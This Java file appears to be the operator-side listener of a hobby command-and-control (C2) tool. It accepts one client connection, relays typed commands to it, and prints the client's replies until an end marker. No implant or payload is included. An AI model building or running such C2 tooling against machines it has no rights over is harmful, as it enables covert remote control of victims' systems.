import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.InetAddress;

public class Sockets {

//Escape codes or sommn for different colors. 
private final String RED = "\u001B[31m";
private final String GREEN = "\u001B[32m";
private final String YELLOW = "\u001B[33m";
private final String RESET = "\u001B[0m";

//Declaring instance variables.
private ServerSocket m_serverSocket;
private Socket m_socket;
private InetAddress m_socketAddress;
private InputStream m_stream;
private int m_serverPort;
private int m_publicPort;

    /**
     * Constructs a new Socket object.
     * @param port - the port used for the socket.
     * @throws IOException
     */
    public Sockets(int port) throws IOException{
        m_serverSocket = new ServerSocket(port);
        
        m_socket = m_serverSocket.accept();
        m_serverPort = m_serverSocket.getLocalPort();
        m_socketAddress = m_serverSocket.getInetAddress();

        System.out.print(GREEN + "Connected To client at " + m_socketAddress + " / " + m_serverPort + "\n" + RESET);
        
        m_stream = m_socket.getInputStream();
    }
    /**
     * Method that listens to a single port, and prints whatever the client connected to the port enters. 
     * WILL NOT BE USEFUL IN THE C2, JUST FOR FUN!
     * @throws IOException
     * @throws InterruptedException
     */

    public void listen() throws IOException, InterruptedException{
        String message = "";
        BufferedReader br = new BufferedReader(new InputStreamReader(m_socket.getInputStream()));
        while(message != null) {

            message=br.readLine();
            if(message != null) {
                System.out.println(GREEN + "Client at port " + m_serverPort + " sent: "+ RESET + message);
            }
        }
        System.out.println(RED + "Client at port " + m_serverPort + " Disconnected." + RESET);
    }



    public void commandeer() throws IOException{
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        BufferedReader clientIn = new BufferedReader(new InputStreamReader(m_socket.getInputStream()));
        DataOutputStream socketOut = new DataOutputStream(m_socket.getOutputStream());
        String userIn = "";
        String clientResponse = "";
        System.out.println("\n - Type \"HELP\" for C2 commands. -\n");

        while(!userIn.equals("done")) {
            System.out.print(YELLOW + "Enter Command: " + RESET);
            userIn = br.readLine();

            System.out.println(GREEN + "Starting client response: " + RESET + "\n");
            socketOut.writeBytes(userIn + "\n");
            socketOut.flush();

            while((clientResponse= clientIn.readLine()) != null) {
                if(clientResponse.equals("__END__")) {
                    break;
                }
                System.out.println(clientResponse);
            }
            System.out.println("\n" + GREEN + "Client response done. " + RESET);
        }
        System.out.println(RED + "Client at port " + m_serverPort + " Disconnected." + RESET);
    }

    
    public ServerSocket getServerSocket() {
        return m_serverSocket;
    }
    
    public int getLocalPort() {
        return m_serverPort;
    }

    public InetAddress getLocalAddress() {
        return m_socketAddress;
    }

    public Socket getLocalSocket() {
        return m_socket;
    }

    public InputStream getInputStream() {
        return m_stream;
    }

    @Override
    public String toString() {
        String str = "";
        if(m_serverPort == -1) {
            str = RED + "Socket CLOSED at " + m_serverPort + RESET;
        } else {
            str = GREEN + "Socket OPEN at " + m_serverPort + RESET; 
        }
        
        return str;
    }
}
